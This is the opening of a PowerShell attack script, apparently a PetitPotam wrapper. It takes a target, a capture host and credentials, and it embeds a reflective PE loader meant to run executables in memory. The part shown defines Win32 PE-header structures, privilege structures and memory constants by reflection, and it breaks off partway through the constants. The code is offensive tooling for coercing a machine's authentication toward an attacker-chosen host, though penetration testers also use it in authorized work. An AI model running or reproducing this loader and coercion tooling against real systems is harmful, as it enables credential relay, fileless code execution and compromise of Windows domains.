function Invoke-Petitpotam
{


Param(

    [string]
    $Target,

    [string]
    $CaptureHost,

    [string]
    $Username,

    [string]
    $Password
)

Set-StrictMode -Version 2


$RemoteScriptBlock = {
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [String]
        $PEBytes64,

        [Parameter(Position = 1, Mandatory = $true)]
        [String]
        $PEBytes32,

        [Parameter(Position = 2, Mandatory = $false)]
        [String]
        $FuncReturnType,

        [Parameter(Position = 3, Mandatory = $false)]
        [Int32]
        $ProcId,

        [Parameter(Position = 4, Mandatory = $false)]
        [String]
        $ProcName,

        [Parameter(Position = 5, Mandatory = $false)]
        [String]
        $ExeArgs
    )

    ###################################
    ##########  Win32 Stuff  ##########
    ###################################
    Function Get-Win32Types
    {
        $Win32Types = New-Object System.Object

        #Define all the structures/enums that will be used
        #   This article shows you how to do this with reflection: http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html
        $Domain = [AppDomain]::CurrentDomain
        $DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
        $ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]


        ############    ENUM    ############
        #Enum MachineType
        $TypeBuilder = $ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])
        $TypeBuilder.DefineLiteral('Native', [UInt16] 0) | Out-Null
        $TypeBuilder.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
        $TypeBuilder.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
        $TypeBuilder.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
        $MachineType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value $MachineType

        #Enum MagicType
        $TypeBuilder = $ModuleBuilder.DefineEnum('MagicType', 'Public', [UInt16])
        $TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
        $MagicType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value $MagicType

        #Enum SubSystemType
        $TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16])
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
        $SubSystemType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $SubSystemType

        #Enum DllCharacteristicsType
        $TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
        $TypeBuilder.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
        $TypeBuilder.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
        $TypeBuilder.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
        $TypeBuilder.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
        $TypeBuilder.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
        $DllCharacteristicsType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $DllCharacteristicsType

        ###########    STRUCT    ###########
        #Struct IMAGE_DATA_DIRECTORY
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DATA_DIRECTORY', $Attributes, [System.ValueType], 8)
        ($TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
        ($TypeBuilder.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
        $IMAGE_DATA_DIRECTORY = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $IMAGE_DATA_DIRECTORY

        #Struct IMAGE_FILE_HEADER
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_FILE_HEADER', $Attributes, [System.ValueType], 20)
        $TypeBuilder.DefineField('Machine', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
        $IMAGE_FILE_HEADER = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $IMAGE_FILE_HEADER

        #Struct IMAGE_OPTIONAL_HEADER64
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER64', $Attributes, [System.ValueType], 240)
        ($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
        ($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
        ($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
        ($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
        ($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
        ($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
        ($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
        ($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
        ($TypeBuilder.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
        ($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
        ($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
        ($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
        ($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
        ($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
        ($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
        ($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
        ($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
        ($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
        ($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
        ($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
        ($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
        ($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
        ($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
        ($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
        ($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
        ($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
        ($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
        ($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
        ($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
        ($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
        ($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
        ($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
        ($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
        ($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
        ($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
        ($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
        ($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
        ($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
        ($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(224) | Out-Null
        ($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(232) | Out-Null
        $IMAGE_OPTIONAL_HEADER64 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $IMAGE_OPTIONAL_HEADER64

        #Struct IMAGE_OPTIONAL_HEADER32
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER32', $Attributes, [System.ValueType], 224)
        ($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
        ($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
        ($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
        ($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
        ($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
        ($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
        ($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
        ($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
        ($TypeBuilder.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
        ($TypeBuilder.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
        ($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
        ($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
        ($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
        ($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
        ($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
        ($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
        ($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
        ($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
        ($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
        ($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
        ($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
        ($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
        ($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
        ($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
        ($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
        ($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(96) | Out-Null
        ($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(104) | Out-Null
        ($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
        ($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
        ($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
        ($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
        ($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
        ($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
        ($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
        ($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
        ($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
        ($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
        ($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
        ($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
        ($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
        ($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
        $IMAGE_OPTIONAL_HEADER32 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $IMAGE_OPTIONAL_HEADER32

        #Struct IMAGE_NT_HEADERS64
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS64', $Attributes, [System.ValueType], 264)
        $TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
        $TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER64, 'Public') | Out-Null
        $IMAGE_NT_HEADERS64 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $IMAGE_NT_HEADERS64

        #Struct IMAGE_NT_HEADERS32
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS32', $Attributes, [System.ValueType], 248)
        $TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
        $TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER32, 'Public') | Out-Null
        $IMAGE_NT_HEADERS32 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $IMAGE_NT_HEADERS32

        #Struct IMAGE_DOS_HEADER
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DOS_HEADER', $Attributes, [System.ValueType], 64)
        $TypeBuilder.DefineField('e_magic', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_cp', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_ss', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_sp', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_csum', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_ip', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_cs', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_ovno', [UInt16], 'Public') | Out-Null

        $e_resField = $TypeBuilder.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
        $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $FieldArray = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
        $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 4))
        $e_resField.SetCustomAttribute($AttribBuilder)

        $TypeBuilder.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null

        $e_res2Field = $TypeBuilder.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
        $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 10))
        $e_res2Field.SetCustomAttribute($AttribBuilder)

        $TypeBuilder.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
        $IMAGE_DOS_HEADER = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $IMAGE_DOS_HEADER

        #Struct IMAGE_SECTION_HEADER
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_SECTION_HEADER', $Attributes, [System.ValueType], 40)

        $nameField = $TypeBuilder.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
        $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 8))
        $nameField.SetCustomAttribute($AttribBuilder)

        $TypeBuilder.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
        $IMAGE_SECTION_HEADER = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $IMAGE_SECTION_HEADER

        #Struct IMAGE_BASE_RELOCATION
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_BASE_RELOCATION', $Attributes, [System.ValueType], 8)
        $TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
        $IMAGE_BASE_RELOCATION = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $IMAGE_BASE_RELOCATION

        #Struct IMAGE_IMPORT_DESCRIPTOR
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_IMPORT_DESCRIPTOR', $Attributes, [System.ValueType], 20)
        $TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
        $IMAGE_IMPORT_DESCRIPTOR = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $IMAGE_IMPORT_DESCRIPTOR

        #Struct IMAGE_EXPORT_DIRECTORY
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_EXPORT_DIRECTORY', $Attributes, [System.ValueType], 40)
        $TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('Base', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
        $IMAGE_EXPORT_DIRECTORY = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $IMAGE_EXPORT_DIRECTORY

        #Struct LUID
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)
        $TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null
        $LUID = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID

        #Struct LUID_AND_ATTRIBUTES
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType], 12)
        $TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null
        $TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
        $LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $LUID_AND_ATTRIBUTES

        #Struct TOKEN_PRIVILEGES
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)
        $TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('Privileges', $LUID_AND_ATTRIBUTES, 'Public') | Out-Null
        $TOKEN_PRIVILEGES = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $TOKEN_PRIVILEGES

        return $Win32Types
    }

    Function Get-Win32Constants
    {
        $Win32Constants = New-Object System.Object

        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
